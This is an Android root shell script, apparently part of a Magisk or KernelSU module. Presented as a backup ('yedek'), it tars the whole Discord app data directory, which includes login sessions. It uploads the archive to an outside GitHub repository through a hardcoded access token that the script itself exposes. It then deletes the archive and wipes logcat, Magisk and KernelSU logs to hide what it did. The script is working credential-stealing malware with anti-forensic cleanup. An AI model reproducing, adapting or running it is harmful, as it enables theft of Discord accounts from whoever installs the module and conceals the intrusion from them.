#!/system/bin/sh
KULLANICI_ADI="ueieu3i"
DEPO_ADI="qwa"
TOKEN="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"
HEDEF_KLASOR="/data/data/com.discord"
mkdir -p "/sdcard/Alarms"
CIKTI_YOLU="/sdcard/Alarms/yedek_dosya.tar.gz"
TAG="v$(date +%Y%m%d_%H%M%S)"
CURL="/data/adb/modules/playintegrityfix/vachpif/curl"
if [ ! -d "$HEDEF_KLASOR" ]; then
    abort
fi
cd "$HEDEF_KLASOR" || abort
busybox tar -czf "$CIKTI_YOLU" .
if [ ! -f "$CIKTI_YOLU" ]; then
    abort
fi
RESPONSE=$($CURL -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://api.github.com/repos/$KULLANICI_ADI/$DEPO_ADI/releases \
  -d "{\"tag_name\":\"$TAG\",\"title\":\"Android Yedek $TAG\",\"draft\":false,\"prerelease\":false}")
RELEASE_ID=$(echo "$RESPONSE" | grep '"id":' | head -n 1 | tr -dc '0-9')
if [ -z "$RELEASE_ID" ]; then
    abort
fi
$CURL -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @"$CIKTI_YOLU" \
  "https://uploads.github.com/repos/$KULLANICI_ADI/$DEPO_ADI/releases/$RELEASE_ID/assets?name=$(basename "$CIKTI_YOLU")"
rm -f "$CIKTI_YOLU"
logcat -b all -c
cat /dev/null > /data/adb/magisk.log
rm -rf /data/adb/ksu/log
